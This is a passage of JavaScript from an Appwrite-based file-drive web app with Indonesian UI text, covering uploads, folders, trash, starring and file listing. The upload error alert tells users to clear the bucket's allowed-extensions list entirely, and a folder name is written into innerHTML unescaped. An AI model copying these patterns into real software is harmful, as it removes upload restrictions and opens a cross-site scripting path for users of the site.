            if (name.match(/\.(jpg|jpeg|png|gif|webp|jfif|svg|bmp|tiff|tif|heif)$/)) storageDetail.images += size;
            else if (name.match(/\.(mp4|mkv|mov|avi|wmv|flv|webm|3gp|mpg|mpeg|avchd|m2ts)$/)) storageDetail.videos += size;
            else if (name.match(/\.(pdf|doc|docx|xls|xlsx|ppt|pptx|txt|rtf|csv|odt|ods|odp)$/)) storageDetail.docs += size;
            else storageDetail.others += size;
        });
        el('storageUsed').innerText = formatSize(storageDetail.total);
        const totalPct = Math.min((storageDetail.total / limit) * 100, 100);
        el('storageBar').style.width = `${totalPct}%`; if(totalPct > 90) el('storageBar').style.backgroundColor = '#ef4444'; else el('storageBar').style.backgroundColor = '';
    } catch (e) { console.error("Gagal hitung storage:", e); }
}

window.openModal = (id) => { el(id).classList.remove('hidden'); if(id==='folderModal') setTimeout(()=>el('newFolderName').focus(),100); };
window.closeModal = (id) => el(id).classList.add('hidden');
window.triggerUploadModal = () => { resetUploadUI(); window.openModal('uploadModal'); };
window.createFolder = () => window.openModal('folderModal');

window.submitCreateFolder = async () => {
    const folderName = el('newFolderName').value.trim(); 
    if (!folderName) return; 
    closeModal('folderModal'); 
    toggleLoading(true, "Membuat Folder...");
    try { 
        try {
            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), { name: folderName, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0, starred: false, trashed: false }); 
        } catch (dbError) {
            console.warn("Fallback Format Lama...");
            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), { nama: folderName, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0 }); 
        }
        loadFiles(currentFolderId); el('newFolderName').value = ''; 
    } catch (e) { alert("Gagal membuat folder: " + e.message); } finally { toggleLoading(false); }
};

window.submitUploadFile = async () => {
    if (!selectedUploadFile) return alert("Pilih file dulu!"); 
    closeModal('uploadModal'); toggleLoading(true, "Mengunggah File...");
    try {
        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), selectedUploadFile);
        const fileUrl = storage.getFileView(CONFIG.BUCKET_ID, up.$id).href;
        try {
            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), { name: selectedUploadFile.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: fileUrl, fileId: up.$id, size: selectedUploadFile.size, starred: false, trashed: false });
        } catch (dbError) {
            console.warn("Fallback Format Lama...");
            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), { nama: selectedUploadFile.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: fileUrl, fileId: up.$id, size: selectedUploadFile.size });
        }
        resetUploadUI(); loadFiles(currentFolderId); calculateStorage();
    } catch (e) { 
        if (e.message.toLowerCase().includes('extension not allowed')) { alert("TOLAKAN SERVER APPWRITE:\n\nFormat file ini tidak diizinkan untuk diupload.\n\nSOLUSI:\n1. Buka Dashboard Appwrite.\n2. Buka menu Storage -> Bucket 'taskfiles' -> tab Settings.\n3. Hapus SEMUA teks di dalam kotak 'Allowed file extensions' (biarkan KOSONG).\n4. Klik Update."); } 
        else { alert("Gagal mengunggah file: " + e.message); }
    } finally { toggleLoading(false); }
};

window.toggleStarItem = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { starred: !selectedItem.starred }); loadFiles(currentViewMode==='root'?currentFolderId:currentViewMode); closeAllMenus(); } catch(e){} };
window.moveItemToTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: true }); loadFiles(currentViewMode==='root'?currentFolderId:currentViewMode); closeAllMenus(); } catch(e){} };
window.restoreFromTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: false }); loadFiles('trash'); closeAllMenus(); } catch(e){} };
window.deleteItemPermanently = async () => { if(!confirm("Hapus permanen? Data tidak bisa kembali!")) return; try { if(selectedItem.type==='file') await storage.deleteFile(CONFIG.BUCKET_ID, selectedItem.fileId); await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id); loadFiles('trash'); calculateStorage(); closeAllMenus(); } catch(e){} };
window.downloadCurrentItem = () => { if(selectedItem && selectedItem.type!=='folder') window.open(storage.getFileDownload(CONFIG.BUCKET_ID, selectedItem.fileId), '_blank'); closeAllMenus(); };
window.renameCurrentItem = async () => { const oldName = selectedItem.name || selectedItem.nama; const newName = prompt("Nama baru:", oldName); if(newName) { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, {name: newName}); } catch(e){ await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, {nama: newName}); } loadFiles(currentFolderId); } closeAllMenus(); };

function resetUploadUI() { selectedUploadFile = null; el('fileInfoContainer').classList.add('hidden'); el('fileInputHidden').value = ''; }
function handleFileSelect(file) { selectedUploadFile = file; el('fileInfoText').innerText = `Terpilih: ${file.name}`; el('fileInfoContainer').classList.remove('hidden'); }
function initDragAndDrop() {
    const zone = el('dropZone'); const input = el('fileInputHidden'); if (!zone) return;
    zone.addEventListener('dragover', (e) => { e.preventDefault(); zone.classList.add('active'); });
    zone.addEventListener('dragleave', () => zone.classList.remove('active')); 
    zone.addEventListener('drop', (e) => { e.preventDefault(); zone.classList.remove('active'); if(e.dataTransfer.files.length > 0) handleFileSelect(e.dataTransfer.files[0]); });
    if(input) input.addEventListener('change', (e) => { if (e.target.files.length > 0) handleFileSelect(e.target.files[0]); });
}

function closeAllMenus() {
    if(el('storageModal')) el('storageModal').classList.add('hidden');
    if(el('globalContextMenu')) el('globalContextMenu').classList.remove('show');
    if(el('dropdownNewMenu')) el('dropdownNewMenu').classList.remove('show');
    if(el('fileContextMenu')) { el('fileContextMenu').classList.add('hidden'); el('fileContextMenu').classList.remove('show'); }
}

function initAllContextMenus() {
    const newBtn = el('newBtnMain'); const newMenu = el('dropdownNewMenu'); const navDrive = el('navDrive'); const globalMenu = el('globalContextMenu'); const mainArea = document.querySelector('.main-content-area');
    if (newBtn) { const newBtnClean = newBtn.cloneNode(true); newBtn.parentNode.replaceChild(newBtnClean, newBtn); const toggleNewMenu = (e) => { e.preventDefault(); e.stopPropagation(); const wasOpen = newMenu.classList.contains('show'); closeAllMenus(); if (!wasOpen) newMenu.classList.add('show'); }; newBtnClean.onclick = toggleNewMenu; newBtnClean.oncontextmenu = toggleNewMenu; }
    if (navDrive) { navDrive.oncontextmenu = (e) => { e.preventDefault(); e.stopPropagation(); closeAllMenus(); globalMenu.style.top = `${e.clientY}px`; globalMenu.style.left = `${e.clientX}px`; globalMenu.classList.add('show'); }; }
    if (mainArea) { mainArea.oncontextmenu = (e) => { if (e.target.closest('.item-card')) return; e.preventDefault(); closeAllMenus(); globalMenu.style.top = `${e.clientY}px`; globalMenu.style.left = `${e.clientX}px`; globalMenu.classList.add('show'); }; }
    window.onclick = (e) => { if (e.target.closest('.modal-box') || e.target.closest('.storage-widget')) return; closeAllMenus(); };
}

async function loadFiles(param) { 
    if (!currentUser) return; 
    const grid = el('fileGrid'); grid.innerHTML = ''; updateHeaderUI(); 
    let queries = [Appwrite.Query.equal('owner', currentUser.$id)]; 
    try {
        if (param === 'recent') queries.push(Appwrite.Query.orderDesc('$createdAt'), Appwrite.Query.equal('trashed', false)); 
        else if (param === 'starred') queries.push(Appwrite.Query.equal('starred', true), Appwrite.Query.equal('trashed', false)); 
        else if (param === 'trash') queries.push(Appwrite.Query.equal('trashed', true)); 
        else { 
            if (typeof param === 'string' && !['root','recent','starred','trash'].includes(param)) currentFolderId = param; 
            queries.push(Appwrite.Query.equal('parentId', currentFolderId), Appwrite.Query.equal('trashed', false)); 
        } 
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, queries); 
        if (res.documents.length === 0) grid.innerHTML = `<div style="grid-column:1/-1;display:flex;flex-direction:column;align-items:center;opacity:0.5;margin-top:50px;"><i class="fa-solid fa-folder-open" style="font-size:4rem;margin-bottom:20px;"></i><p>Folder Kosong</p></div>`; 
        else res.documents.forEach(doc => renderItem(doc)); 
    } catch (e) { 
        console.warn("Fallback Load Files");
        let basicQueries = [Appwrite.Query.equal('owner', currentUser.$id)];
        if (typeof param === 'string' && !['root','recent','starred','trash'].includes(param)) currentFolderId = param; 
        basicQueries.push(Appwrite.Query.equal('parentId', currentFolderId));
        try {
            const fallbackRes = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, basicQueries);
            if (fallbackRes.documents.length === 0) grid.innerHTML = `<div style="grid-column:1/-1;display:flex;flex-direction:column;align-items:center;opacity:0.5;margin-top:50px;"><i class="fa-solid fa-folder-open" style="font-size:4rem;margin-bottom:20px;"></i><p>Folder Kosong</p></div>`; 
            else fallbackRes.documents.forEach(doc => renderItem(doc)); 
        } catch(fallbackErr) { console.error(fallbackErr); }
    } 
}

function updateHeaderUI() { 
    const container = document.querySelector('.breadcrumb-area'); const isRoot = currentFolderId === 'root' && currentViewMode === 'root'; 
    if (isRoot) { 
        const h = new Date().getHours(); const s = h < 12 ? "Morning" : h < 18 ? "Afternoon" : "Night"; 
        container.innerHTML = `<h2 id="headerTitle">Welcome In Drive ${s}</h2>`; 
    } else { 
        container.innerHTML = `<div class="back-nav-container"><button onclick="goBack()" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Kembali ke Drive</button><h2 id="headerTitle" style="margin-top:10px;">${currentFolderName}</h2></div>`; 
    } 
}

window.togglePass = (id, icon) => { const input = document.getElementById(id); if (input.type === "password") { input.type = "text"; icon.classList.remove("fa-eye-slash"); icon.classList.add("fa-eye"); } else { input.type = "password"; icon.classList.remove("fa-eye"); icon.classList.add("fa-eye-slash"); } };